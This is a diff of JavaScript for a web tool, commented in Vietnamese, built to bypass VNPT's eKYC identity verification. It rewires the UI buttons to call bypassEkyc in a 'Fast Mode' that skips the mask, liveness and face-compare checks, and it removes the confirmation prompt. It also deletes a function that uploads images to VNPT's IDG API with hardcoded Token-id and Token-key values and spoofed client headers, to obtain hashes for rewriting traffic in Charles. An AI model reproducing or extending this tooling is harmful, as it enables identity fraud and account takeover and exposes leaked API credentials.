@@ -424,15 +424,10 @@ document.addEventListener('DOMContentLoaded', () => {
                                 <a href="${src}" download="${fileName}" class="btn-download" title="Tải ảnh này">
                                     <i class="fa-solid fa-download"></i>
                                 </a>
-                                <button type="button" class="btn-verify" data-src="${src}" onclick="bypassEkyc('${phone}', this)" title="Full flow (mask+liveness+xacthuc)">
+                                <button type="button" class="btn-verify" style="background:linear-gradient(135deg,#00c896,#00a876);" data-src="${src}" onclick="bypassEkyc('${phone}', this, true)" title="Xác thực (Fast Mode)">
                                     <i class="fa-solid fa-bolt"></i> Xác thực
                                 </button>
-                                <button type="button" class="btn-verify" style="background:linear-gradient(135deg,#00c896,#00a876);font-size:11px;" data-src="${src}" onclick="bypassEkyc('${phone}', this, true)" title="Fast mode: Bỏ qua AI (dùng khi real app đã tạo IDG session)">
-                                    <i class="fa-solid fa-forward"></i> Fast
-                                </button>
-                                <button type="button" class="btn-verify" style="background:linear-gradient(135deg,#ff9800,#f57c00);font-size:11px;width:100%;margin-top:5px;" data-src="${src}" onclick="uploadAndGetHash(this)" title="Chỉ lấy Hash của ảnh này">
-                                    <i class="fa-solid fa-cloud-arrow-up"></i> Lấy Hash
-                                </button>
+                                
                             </div>
                         </div>
                     </div>
@@ -464,69 +459,6 @@ document.addEventListener('DOMContentLoaded', () => {
         panel.style.transition = `none`;
     });
 });
-
-window.uploadAndGetHash = async function(btnElement) {
-    if (!btnElement) return alert('Chua chon anh nao!');
-    const imageSrc = btnElement.dataset.src;
-    if (!imageSrc) return alert("Khong tim thay du lieu anh!");
-
-    
-    // Get token
-    let idgToken = _cachedIdgToken;
-    if (!idgToken) {
-        alert('Dang lay Token. Vui long doi 1 giay va bam lai!');
-        prefetchIdgToken();
-        return;
-    }
-
-    try {
-        const { blob } = await new Promise((resolve, reject) => {
-            const img = new Image();
-            img.crossOrigin = 'Anonymous';
-            img.onload = () => {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                canvas.width = img.width; canvas.height = img.height;
-                ctx.drawImage(img, 0, 0);
-                canvas.toBlob(blob => resolve({ blob }), 'image/jpeg', 0.95);
-            };
-            img.onerror = () => reject(new Error("Loi tai anh"));
-            img.src = imageSrc;
-        });
-
-        const idgHeaders = {
-            'Authorization': idgToken,
-            'Connection': 'Keep-Alive',
-            'mac-address': localStorage.getItem('vnpt_device_id') || "0f8c2d3fb0c51653",
-            'Token-id': '04c0a953-7fb8-5461-e063-62199f0aeda6',
-            'Token-key': 'MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAKjy7FK9SegSCW0cuUIbEDUsbRZOcoxijNPLMfvgX+8/XA7HebHXMN4/PO5c5mwK31Yk31RKuMXYLLp6x6oZPDkCAwEAAQ==',
-            'User-Agent': 'okhttp/4.11.0'
-        };
-
-        let p_image_hash = '';
-        for (let addTry = 1; addTry <= 5; addTry++) {
-            const fd = new FormData();
-            fd.append('file', blob, 'portrait_full.jpg');
-            fd.append('title', 'portrait_full.jpg');
-            fd.append('description', 'portrait_full.jpg');
-            const afRes = await fetch('https://api.idg.vnpt.vn/file-service/v1/addFile', { method: 'POST', headers: idgHeaders, body: fd });
-            const afData = await afRes.json();
-            if (afData.object?.hash) {
-                p_image_hash = afData.object.hash;
-                const zone = p_image_hash.split('/')[0];
-                if (zone === 'zone2' || zone === 'zone3') break;
-            }
-        }
-        
-        if (p_image_hash) {
-            prompt('Đã upload thành công! Hãy copy Hash dưới đây để dùng trong Charles Rewrite:', p_image_hash);
-        } else {
-            alert('Upload thất bại. Vui lòng thử lại!');
-        }
-    } catch(e) {
-        alert('Lỗi: ' + e.message);
-    }
-};
 
 // ===== PRE-LOAD IDG TOKEN CACHE (cho Fast Mode khoi dong ngay) =====
 
@@ -564,10 +496,7 @@ setInterval(() => { if (localStorage.getItem('vnpt_access_token')) prefetchIdgTo
 window.bypassEkyc = async function(phone, btnElement, fastMode = false) {
     const imageSrc = btnElement.dataset.src;
     if (!imageSrc) return alert("Khong tim thay du lieu anh!");
-    if (fastMode) {
-        const ok = confirm(`⚡ FAST MODE\n\nBỏ qua AI calls (mask/liveness/compare).\nChỉ dùng khi real VNPT app vừa hoàn thành mask/liveness cho số: ${phone}\n\nIDG session thường valid 5-15 phút sau khi real app chạy.\n\nTiếp tục?`);
-        if (!ok) return;
-    }
+
     btnElement.classList.add('loading');
     btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Xu ly...';
     btnElement.disabled = true;
